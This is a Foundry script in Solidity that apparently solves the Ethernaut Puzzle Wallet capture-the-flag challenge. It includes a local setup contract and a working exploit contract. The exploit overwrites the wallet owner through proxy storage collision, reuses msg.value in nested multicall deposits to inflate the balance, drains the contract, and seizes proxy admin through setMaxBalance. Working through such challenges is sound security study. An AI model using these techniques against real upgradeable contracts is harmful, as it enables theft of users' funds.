pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/PuzzleWallet.sol";
import {console} from "forge-std/console.sol";

// set up for local testing
contract deploy is Script
{
    function run() external
    {
        vm.startBroadcast();

        PuzzleWallet wallet = new PuzzleWallet();
        address walletAddr = address(wallet);

        PuzzleProxy proxy = new PuzzleProxy(msg.sender, walletAddr, "");
        address proxyAddr = address(proxy);

        proxyAddr.call(abi.encodeWithSelector(PuzzleProxy.proposeNewAdmin.selector, msg.sender));
        proxyAddr.call(abi.encodeWithSelector(PuzzleWallet.addToWhitelist.selector, msg.sender));
        proxyAddr.call{value: 0.001 ether}(abi.encodeWithSelector(PuzzleWallet.deposit.selector));

        console.log("proxy address:", proxyAddr);
        console.log("wallet address:", walletAddr);
        console.log("-----------");

        (bool success, bytes memory data) = proxyAddr.call(abi.encodeWithSignature("whitelisted(address)", msg.sender));

        bool imWhitelisted = abi.decode(data, (bool));
        console.log("msg sender whitelisted:", imWhitelisted);
        console.log("admin:", proxy.admin());
        console.log("pending admin:", proxy.pendingAdmin());

        (success, data) = proxyAddr.call(abi.encodeWithSignature("owner()"));
        address walletOwner = abi.decode(data, (address));
        console.log("wallet owner:", walletOwner);

        (success,data) = proxyAddr.call(abi.encodeWithSignature("maxBalance()"));
        uint maxBalanceOrProxyAdmin = abi.decode(data, (uint256));
        console.log("wallet max balance:", address(uint160(maxBalanceOrProxyAdmin)));

        console.log("wallet contract balance:", walletAddr.balance);
        console.log("proxy contract balance:", proxyAddr.balance);

        vm.stopBroadcast();
    }
}

contract script is Script
{
    function run() external
    {
        address payable proxyAddr = payable(/* instance address */);
        PuzzleProxy walletProxy = PuzzleProxy(proxyAddr);

        vm.startBroadcast();

        walletProxy.proposeNewAdmin(msg.sender); // overwrite the owner field of the wallet
        proxyAddr.call(abi.encodeWithSelector(PuzzleWallet.addToWhitelist.selector, msg.sender));

        bytes[] memory insideCalls = new bytes[](1);
        insideCalls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
// double the balance:
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, insideCalls);
// in order to triple the balance: (can continue as many times as you like,
// for example if you wanna increase your balance with a call value smaller than 0.001 ether
// recursion depth will need to be adjusted accordingly)
//      bytes[] memory outCalls = new bytes[](2);
//      outCalls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
//      outCalls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, calls);
//
//     Trigger the multicall with 0.001 Ether
// msg value will persist for the entire call tho depositCalled will be reset for each context as it is declared in memory not storage
        proxyAddr.call{value: 0.001 ether}(abi.encodeWithSelector(PuzzleWallet.multicall.selector, calls));

        proxyAddr.call(abi.encodeWithSelector(PuzzleWallet.execute.selector, msg.sender, 0.002 ether, ""));
        require(proxyAddr.balance == 0, "proxy's balance did not become 0");

        proxyAddr.call(abi.encodeWithSelector(PuzzleWallet.setMaxBalance.selector, uint(uint160(msg.sender))));
        console.log("proxy admin:", walletProxy.admin()); // assure it's you (;

        vm.stopBroadcast();
    }
}
